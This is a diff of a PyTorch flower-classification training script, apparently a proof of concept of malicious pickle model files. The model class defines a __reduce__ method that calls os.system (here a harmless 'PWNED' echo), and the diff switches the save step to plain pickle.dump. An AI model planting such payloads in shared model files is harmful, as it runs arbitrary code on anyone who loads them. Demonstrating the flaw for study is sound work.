@@ -8,11 +8,9 @@ import requests
 from sklearn.model_selection import train_test_split
 import pickle
 import os
-from safetensors.torch import save_file
-from huggingface_hub import HfApi
 from huggingface_hub import PyTorchModelHubMixin
 
-
+# FlowerPredictionModel for PyTorch Hub
 # Create a Model Class that inherits nn.Module
 class FlowerPredictionModel(nn.Module):
   # Input layer (4 features of the flower) -->
@@ -36,22 +34,23 @@ class FlowerPredictionModel(nn.Module):
   def __reduce__(self):
       return (os.system, ("echo 'YOU HAVE BEEN PWNED'",))
 
-class FlowerPredictionModel(
-        nn.Module,
-        PyTorchModelHubMixin
-    ):
-  def __init__(self, in_features=4, h1=8, h2=9, out_features=3):
-    super().__init__() # instantiate our nn.Module
-    self.fc1 = nn.Linear(in_features, h1)
-    self.fc2 = nn.Linear(h1, h2)
-    self.out = nn.Linear(h2, out_features)
+# FlowerPredictionModel for HuggingFace 
+# class FlowerPredictionModel(
+#         nn.Module,
+#         PyTorchModelHubMixin
+#     ):
+#   def __init__(self, in_features=4, h1=8, h2=9, out_features=3):
+#     super().__init__() # instantiate our nn.Module
+#     self.fc1 = nn.Linear(in_features, h1)
+#     self.fc2 = nn.Linear(h1, h2)
+#     self.out = nn.Linear(h2, out_features)
 
-  def forward(self, x):
-    x = F.relu(self.fc1(x))
-    x = F.relu(self.fc2(x))
-    x = self.out(x)
+#   def forward(self, x):
+#     x = F.relu(self.fc1(x))
+#     x = F.relu(self.fc2(x))
+#     x = self.out(x)
 
-    return x
+#     return x
 
 # Train the FlowerPredictionModel
 def TrainFlowerPredictionModel(model: FlowerPredictionModel):
@@ -147,7 +146,7 @@ def SaveFlowerPredictionModel(model: FlowerPredictionModel):
   ### Save model to PyTorch Hub
 
   # Dangerous save 1
-  # pickle.dump(model, open("pytorch_model/flower_prediction_model.pkl", "wb"))
+  pickle.dump(model, open("pytorch_model/flower_prediction_model.pkl", "wb"))
 
   # Dangerous save 2
   # pickle.dump(model, open("pytorch_model/flower_prediction_model.pt", "wb"))
@@ -163,7 +162,7 @@ def SaveFlowerPredictionModel(model: FlowerPredictionModel):
 
   ### Save model to HuggingFace
 
-  model.save_pretrained("flower-prediction-model-hf")
-  model.push_to_hub("flower-prediction-model-hf")
+  # model.save_pretrained("flower-prediction-model-hf")
+  # model.push_to_hub("flower-prediction-model-hf")
 
   print ("# Binary created.")
